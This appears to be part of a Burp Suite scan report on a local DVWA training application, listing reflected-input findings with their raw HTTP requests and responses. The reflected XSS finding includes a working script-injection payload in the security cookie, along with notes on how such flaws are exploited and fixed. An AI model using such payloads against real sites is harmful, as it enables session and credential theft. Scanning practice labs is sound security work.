<span class="BODH1" id="23.9">23.9.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400120_useragentdependentresponse">User agent-dependent response</a></span>
<br><a class="PREVNEXT" href="#23.8">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.10">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>Application responses may depend systematically on the value of the User-Agent header in requests. This behavior does not itself constitute a security vulnerability, but may point towards additional attack surface within the application, which may contain vulnerabilities.</p>
<p>This behavior often arises because applications provide different user interfaces for desktop and mobile users. Mobile interfaces have often been less thoroughly tested for vulnerabilities such as cross-site scripting, and often have simpler authentication and session handling mechanisms that may contain problems that are not present in the full interface.</p>
<p>To review the interface provided by the alternate User-Agent header, you can configure a match/replace rule in Burp Proxy to modify the User-Agent header in all requests, and then browse the application in the normal way using your normal browser. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=np9qgntc28sed96ai0a7u01guu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br><span class="HIGHLIGHT">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:30 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: <span class="HIGHLIGHT">4374</span><br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;em&gt;<span class="HIGHLIGHT">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span>&lt;/em&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=a2ri193h7q3jq4eu1ntcl80mmu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br><span class="HIGHLIGHT">User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3</span><br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:40 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: <span class="HIGHLIGHT">4394</span><br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;em&gt;<span class="HIGHLIGHT">Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3</span>&lt;/em&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="23.10">23.10.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#23.9">Previous</a>
&nbsp;<a class="PREVNEXT" href="#24.1">Next</a>
<br>
<br><span class="TEXT">There are 4 instances of this issue:
<ul>
<li><a href="#23.10.1">/dvwa/vulnerabilities/fi/ [Referer HTTP header]</a></li>
<li><a href="#23.10.2">/dvwa/vulnerabilities/fi/ [User-Agent HTTP header]</a></li>
<li><a href="#23.10.3">/dvwa/vulnerabilities/fi/ [page parameter]</a></li>
<li><a href="#23.10.4">/dvwa/vulnerabilities/fi/ [security cookie]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="23.10.1">23.10.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [Referer HTTP header]</span>
<br><a class="PREVNEXT" href="#23.5.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.10.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>Referer</b> HTTP header is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=a2ri193h7q3jq4eu1ntcl80mmu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<span class="HIGHLIGHT">7dtz1l3c9d</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:37 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4384<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;em&gt;http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<span class="HIGHLIGHT">7dtz1l3c9d</span>&lt;/em&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="23.10.2">23.10.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [User-Agent HTTP header]</span>
<br><a class="PREVNEXT" href="#23.10.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.10.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>User-Agent</b> HTTP header is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=file3.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=a2ri193h7q3jq4eu1ntcl80mmu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/fi/?page=include.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<span class="HIGHLIGHT">qge0kplvsf</span><br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:35 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4384<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;em&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<span class="HIGHLIGHT">qge0kplvsf</span>&lt;/em&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="23.10.3">23.10.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [page parameter]</span>
<br><a class="PREVNEXT" href="#23.10.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#23.10.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>page</b> request parameter is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=include.php<span class="HIGHLIGHT">2w2cicnw95</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=ic77v7ifnktm92p700m44fh7i4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:11 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 3561<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;br /&gt;<br>&lt;b&gt;Warning&lt;/b&gt;:  include(include.php<span class="HIGHLIGHT">2w2cicnw95</span>): Failed to open stream: No such file or directory in &lt;b&gt;C:\xampp\htdocs\DVWA\vulnerabilities\fi\index.php&lt;/b&gt; on line &lt;b&gt;36&lt;/b&gt;&lt;br /&gt;<br>&lt;br /&gt;<br>&lt;b&gt;W<br><b>...[SNIP]...</b><br>&lt;/b&gt;:  include(): Failed opening 'include.php<span class="HIGHLIGHT">2w2cicnw95</span>' for inclusion (include_path='C:\xampp\php\PEAR;../../external/phpids/0.6/lib/') in &lt;b&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="23.10.4">23.10.4.&nbsp;http://localhost:7878/dvwa/vulnerabilities/fi/ [security cookie]</span>
<br><a class="PREVNEXT" href="#23.10.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#25.1.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/fi/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">h6w2ufncud</span>; PHPSESSID=ic77v7ifnktm92p700m44fh7i4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:23 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=ic77v7ifnktm92p700m44fh7i4; path=/<br>Set-Cookie: security=low<br>Content-Length: 4103<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA) <br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=fi&amp;security=low<span class="HIGHLIGHT">h6w2ufncud</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=fi&amp;security=low<span class="HIGHLIGHT">h6w2ufncud</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="24">24.&nbsp;http://localhost:7878/dvwa/vulnerabilities/javascript/</span>
<br><a class="PREVNEXT" href="#23">Previous</a>
&nbsp;<a class="PREVNEXT" href="#25">Next</a>
<br>
<span class="BODH1" id="24.1">24.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#23.10">Previous</a>
&nbsp;<a class="PREVNEXT" href="#24.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/javascript/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>ipkd7'&gt;&lt;script&gt;alert(1)&lt;/script&gt;xktna</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/javascript/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">ipkd7'%3e%3cscript%3ealert(1)%3c%2fscript%3exktna</span>; PHPSESSID=s2437t6rdabfc63b7v244c9f2f<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:20 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=s2437t6rdabfc63b7v244c9f2f; path=/<br>Set-Cookie: security=low<br>Content-Length: 4211<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: JavaScript Attacks :: Damn Vulnerable Web Application (DV<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=javascript&amp;security=low<span class="HIGHLIGHT">ipkd7'&gt;&lt;script&gt;alert(1)&lt;/script&gt;xktna</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="24.2">24.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#24.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#24.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/javascript/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
